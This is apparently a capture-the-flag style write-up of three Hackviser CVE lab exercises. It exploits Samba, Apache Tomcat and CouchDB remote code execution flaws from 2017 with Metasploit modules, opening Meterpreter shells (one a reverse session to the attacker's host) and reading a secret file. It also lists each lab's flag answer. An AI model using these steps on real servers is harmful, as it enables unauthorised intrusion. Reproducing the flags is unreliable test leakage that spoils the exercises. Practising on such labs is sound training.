---
title: 'CVE 2017'
date: '2026-05-04'
excerpt: 'CVE-2017-7494, CVE-2017-12617, CVE-2017-12636'
prog: 'Hackviser CVE Labs  -  May 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_hackviser_logo.webp" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">CVE 2017</h1>
<div class="writeup-date">May 2026 · CVE Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>

<h5 class="mb-2">1. Samba 3.5.0 - 4.6.4 Remote Code Execution (CVE-2017-7494)</h5>
<p class="mb-3"><strong>Samba is an open-source network file system protocol that provides services such as file and printer sharing. This laboratory contains the CVE-2017-7494 vulnerability found in Samba versions since 3.5.0 and before 4.6.4, 4.5.10, and 4.4.14. This vulnerability allows attackers to perform remote code execution attacks, enabling the execution of arbitrary commands on the server and potentially taking control of the system. What is the secret in the /secret.txt file?</strong></p>
<p class="mb-3">First we run <code>nmap -sC -sV -A [target_IP]</code> to confirm which ports are open.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2017/cve-2017-7494/cvelabs_cve-2017-7494_image1.png" alt="CVE-2017-7494 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2017-7494</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2017/cve-2017-7494/cvelabs_cve-2017-7494_image2.png" alt="CVE-2017-7494 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to spawn a standard system process to allow us to execute code on the target machine. Then we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2017/cve-2017-7494/cvelabs_cve-2017-7494_image3.png" alt="CVE-2017-7494 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> AvadaKedavra</p>
<br />

<h5 class="mb-2">2. Apache Tomcat JSP Upload Bypass Remote Code Execution (CVE-2017-12617)</h5>
<p class="mb-3"><strong>Apache Tomcat is a popular and widely-used web server and servlet container that supports Java Servlet and JavaServer Pages technologies. This laboratory contains the CVE-2017-12617 vulnerability found in Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46, and 7.0.0 to 7.0.81. This vulnerability allows attackers to upload JSP files via specially crafted requests when HTTP PUT is enabled (e.g., by setting the Default servlet's readonly initialization parameter to false). The uploaded JSP file could then be requested and any code contained within it would be executed by the server, allowing attackers to execute arbitrary code on the server. What is the secret in the /secret.txt file?</strong></p>
<p class="mb-3">We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2017-12617</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2017/cve-2017-12617/cvelabs_cve-2017-12617_image1.png" alt="CVE-2017-12617 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to spawn a standard system process to allow us to execute code on the target machine. Then we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2017/cve-2017-12617/cvelabs_cve-2017-12617_image2.png" alt="CVE-2017-12617 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Diplodocus</p>
<br />

<h5 class="mb-2">3. Apache CouchDB 1.7.0/2.x < 2.1.1 Remote Code Execution (CVE-2017-12636)</h5>
<p class="mb-3"><strong>Apache CouchDB is an open-source, document-oriented NoSQL database that provides storage and querying of JSON documents, with a RESTful API accessible via HTTP/HTTPS. This laboratory contains the CVE-2017-12636 vulnerability found in Apache CouchDB versions 1.7.0 and 2.x before 2.1.1. This vulnerability allows attackers to specify paths for operating system-level binaries when configuring the CouchDB server via HTTP(S), which are subsequently launched by CouchDB. This enables attackers to run arbitrary shell commands as the CouchDB user, including downloading and executing scripts from the public internet. What is the secret in the /secret.txt file?</strong></p>
<p class="mb-3">We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2017-12636</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2017/cve-2017-12636/cvelabs_cve-2017-12636_image1.png" alt="CVE-2017-12636 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to spawn a standard system process to allow us to execute code on the target machine. Then we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2017/cve-2017-12636/cvelabs_cve-2017-12636_image2.png" alt="CVE-2017-12636 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Titanium</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>